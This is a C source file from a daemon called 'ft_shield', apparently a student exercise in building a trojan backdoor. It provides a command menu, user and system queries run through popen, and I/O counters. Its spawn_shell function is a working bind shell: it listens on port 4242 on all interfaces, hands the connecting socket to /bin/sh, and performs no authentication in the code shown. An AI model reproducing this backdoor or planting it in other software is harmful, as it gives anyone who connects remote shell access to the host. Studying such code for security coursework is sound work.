#include "../inc/ft_daemon.h"

void print_usage(int client_fd, t_shield *daemon)
{
	const char *usage =
		"ft_shield usage:\n"
		"  ?           : Show this help message.\n"
		"  shell       : Spawn a shell on port 4242.\n"
		"  users       : List currently logged in users.\n"
		"  system      : Display system information.\n"
		"  stats       : Show I/O statistics for the daemon.\n"
		"  quit        : Stop the daemon.\n";

	daemon->bytes_out += send(client_fd, usage, strlen(usage), 0);
	display_prompt(client_fd, daemon);
}

void	spawn_shell(t_shield *daemon, int client_fd)
{
	char output[] = "Spawning shell on port 4242.\n";
	daemon->bytes_out += send(client_fd, output, strlen(output), 0);

	if (daemon->listen_fd != -1)
	{
		close(daemon->listen_fd);
		daemon->listen_fd = -1;
	}
	close_all_clients(daemon);

	pid_t shell_pid = fork();
	if (!shell_pid)
	{
		int shell_listen_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (shell_listen_fd < 0)
			exit (EXIT_FAILURE);

		int opt = 1;
		setsockopt(shell_listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = INADDR_ANY;
		addr.sin_port = htons(PORT);

		if (bind(shell_listen_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0)
			exit (EXIT_FAILURE);
		if (listen(shell_listen_fd, 1) < 0)
		{
			close(shell_listen_fd);
			exit (EXIT_FAILURE);
		}
		int shell_client_fd = accept(shell_listen_fd, NULL, NULL);
		close(shell_listen_fd);

		dup2(shell_client_fd, STDIN_FILENO);
		dup2(shell_client_fd, STDOUT_FILENO);
		dup2(shell_client_fd, STDERR_FILENO);
		close(shell_client_fd);

		execl("/bin/sh", "sh", NULL);
		exit(EXIT_FAILURE);
	}
	else if (shell_pid > 0)
	{
		int status;
		waitpid(shell_pid, &status, 0);

		daemon->listen_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (daemon->listen_fd >= 0)
		{
			int opt = 1;
			setsockopt(daemon->listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = INADDR_ANY;
			addr.sin_port = htons(PORT);

			if (!bind(daemon->listen_fd, (struct sockaddr*)&addr, sizeof(addr)))
				listen(daemon->listen_fd, 5);
		}
	}
	else
		setup_socket(daemon);
}

void	send_sys_output(const char *cmd, int client_fd, t_shield *daemon)
{
	FILE *fp;
	char buffer[BUFFER_SIZE];
	char *msg = NULL;

	fp = popen(cmd, "r");
	if (!fp)
		return ;

	if (!strcmp(cmd, "who"))
		msg = "=== Currently logged in users ===\n";
	else if (!strcmp(cmd, "uname -a"))
		msg = "=== System information ===\n";
	else if (!strcmp(cmd, "uptime"))
		msg = "=== System uptime ===\n";
	if (msg)
		daemon->bytes_out += send(client_fd, msg, strlen(msg), 0);

	while (fgets(buffer, sizeof(buffer), fp))
		daemon->bytes_out += send(client_fd, buffer, strlen(buffer), 0);
	pclose(fp);
}

void	display_prompt(int client_fd, t_shield *daemon)
{
	const char *prompt = ">_ ";
	daemon->bytes_out += send(client_fd, prompt, strlen(prompt), 0);
}

void	display_stats(int client_fd, t_shield *daemon, int client_id)
{
	char buffer[BUFFER_SIZE];

	snprintf(buffer, sizeof(buffer),
			"=== Daemon session I/O ===\n"
			"Active client ID: %d\n"
			"Received: %zu bytes | Sent: %zu bytes\n",
			client_id, daemon->bytes_in, daemon->bytes_out);
	daemon->bytes_out += send(client_fd, buffer, strlen(buffer), 0);
}
